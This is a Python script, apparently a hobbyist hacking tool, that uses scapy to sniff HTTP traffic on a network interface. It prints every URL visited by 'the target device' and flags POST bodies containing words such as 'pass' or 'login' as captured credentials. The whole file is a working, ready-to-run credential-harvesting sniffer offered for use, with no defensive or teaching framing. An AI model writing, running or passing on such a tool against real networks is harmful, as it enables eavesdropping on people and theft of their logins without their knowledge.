#!/usr/bin/env python3

import argparse
import socket
import os
import sys
import signal
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # CTRL + C

# Arguments Menu
def get_arguments():
    argparser = argparse.ArgumentParser(description="HTTP Sniffer")
    argparser.add_argument("-i", "--interface", dest="interface", required=True, help="Network Interface Name. (Ex: wlan0)")

    args = argparser.parse_args()

    return args.interface

# Verify correct Interface Name and Root privileges
def verify(interface):

    if os.getuid() != 0:
        print(colored("\n[!] Root privileges are required.\n", "yellow"))
        sys.exit(1)

    existing_interfaces = [interface[1] for interface in socket.if_nameindex()]

    return interface in existing_interfaces

# process each packet received
def process_packet(packet):
    cred_keywords = ["user", "mail", "pass", "login"] # Potential keywords for credentials

    if packet.haslayer(http.HTTPRequest): # Verify if a packet contain HTTPRequest layer
        url = "http://" + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode() # Retrive host and path to complete the url
        print(colored(f"[-] Visited URL: {url}", "blue"))

        if packet.haslayer(scapy.Raw): # Verify if a packet contain Raw layer (usually comes when is a POST request and the packet could contain data)
            load = packet[scapy.Raw].load.decode() # Retrieve the data from Raw layer
            if any(cred in load for cred in cred_keywords): # Verify if it may be credentials
                print(colored(f"\n[+] Potential credentials: {load}\n", "green"))    

# Sniffing
def sniff(interface):
    print(colored("\n[+] Capturing all HTTP traffic from the target device:\n", "magenta"))
    scapy.sniff(iface=interface, prn=process_packet, store=0) # Start sniffing on the provided network interface

# Banner
def print_banner():
    print(colored("""
█░█ ▀█▀ ▀█▀ █▀█   █▀ █▄░█ █ █▀▀ █▀▀ █▀▀ █▀█
█▀█ ░█░ ░█░ █▀▀   ▄█ █░▀█ █ █▀░ █▀░ ██▄ █▀▄\n""", 'white'))

    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))

# Main logic
def main():
    print_banner()
    interface = get_arguments() # Get interface argument
    isValid = verify(interface) # Valid interface argument format

    if isValid:
        sniff(interface) # Execute sniff
    else:
        print(colored("\n[!] Invalid Network Interface Name\n", "red"))

if __name__ == "__main__":
    main()
